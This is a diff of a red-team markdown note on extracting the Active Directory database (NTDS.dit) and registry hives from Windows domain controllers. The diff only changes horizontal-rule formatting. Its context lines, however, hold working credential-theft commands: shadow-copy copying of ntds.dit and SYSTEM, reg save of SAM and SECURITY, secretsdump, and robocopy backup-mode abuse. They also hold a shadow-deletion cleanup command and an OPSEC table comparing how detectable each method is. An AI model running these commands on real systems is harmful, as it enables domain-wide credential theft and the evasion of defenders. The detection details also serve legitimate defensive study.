@@ -16,7 +16,7 @@ linked:
 ---
 # NTDS.dit Extraction - VSS y ntdsutil Methods
 
-***
+---
 
 ## vssadmin (Shadow Copy)
 
@@ -40,7 +40,7 @@ copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SY
 vssadmin delete shadows /all /quiet
 ```
 
-___
+---
 
 ## Diskshadow (LOLBin)
 
@@ -70,7 +70,7 @@ copy Z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit
 copy Z:\Windows\System32\config\SYSTEM C:\temp\SYSTEM
 ```
 
-___
+---
 
 ## ntdsutil IFM
 
@@ -94,7 +94,7 @@ ntdsutil "ac i ntds" "ifm" "create full C:\temp\ifm" quit quit
 
 **Key:** ntdsutil IFM es el método más limpio — usa VSS transparentemente. Requiere DA o Domain Controllers group.
 
-___
+---
 
 ## reg save (Hives)
 
@@ -114,7 +114,7 @@ reg save HKLM\SECURITY C:\temp\SECURITY /y
 impacket-secretsdump -system SYSTEM -sam SAM -security SECURITY LOCAL
 ```
 
-___
+---
 
 ## Robocopy Backup Mode
 
@@ -134,7 +134,7 @@ robocopy "%SHADOW%\Windows\System32\config" C:\temp SYSTEM /b
 
 **Key:** Backup Operators tienen `SeBackupPrivilege` por default → path a DC dump sin ser DA.
 
-___
+---
 
 ## OPSEC Comparison
 
@@ -148,4 +148,4 @@ ___
 | DCSync (remoto) | 4662 (replication GUIDs) | "DCSync attempt" | DCSync ACE | Medio |
 ^ntds-vss-opsec
 
-***
+---
